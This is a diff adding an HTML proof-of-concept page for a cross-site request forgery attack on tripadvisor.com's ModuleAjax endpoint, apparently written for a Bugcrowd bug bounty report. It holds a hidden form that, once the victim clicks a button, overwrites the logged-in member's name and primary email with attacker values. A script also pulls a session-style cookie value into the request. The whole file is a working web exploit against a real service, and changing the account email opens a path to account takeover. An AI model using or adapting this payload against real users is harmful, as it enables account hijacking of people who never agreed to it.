@@ -1,0 +1,28 @@
+<!-- Host this on HTTPS server -->
+<html>
+<body>
+  <form id="csrfForm" action="https://www.tripadvisor.com/ModuleAjax" method="POST">
+    <input type="hidden" name="actions" value='[{"params":{"firstname":"ziadbugcrowd","lastname":"test","primaryEmail":"ziad686@bugcrowdninja.com"},"name":"SAVE","resource":"modules.common.entity.LoggedInMember"}]'>
+    <input type="hidden" name="context" value='{"modules.membercenter.model.ContributionCounts":[{"memberId":"FOY3v6GnNeOB/lMD3V9UCA=="}]}'>
+    <input type="hidden" name="authenticator" value="Random">
+    <input type="hidden" name="version" value="5">
+    <input type="hidden" name="token" id="tokenInput">
+  </form>
+
+  <button onclick="submitForm()">Click to Update Profile</button>
+
+  <script>
+    // Extract token from cookie
+    const token = document.cookie
+      .split('; ')
+      .find(row => row.startsWith('roybatty='))
+      ?.split('=')[1] || '';
+
+    document.getElementById('tokenInput').value = token;
+
+    function submitForm() {
+      document.getElementById('csrfForm').submit();
+    }
+  </script>
+</body>
+</html>
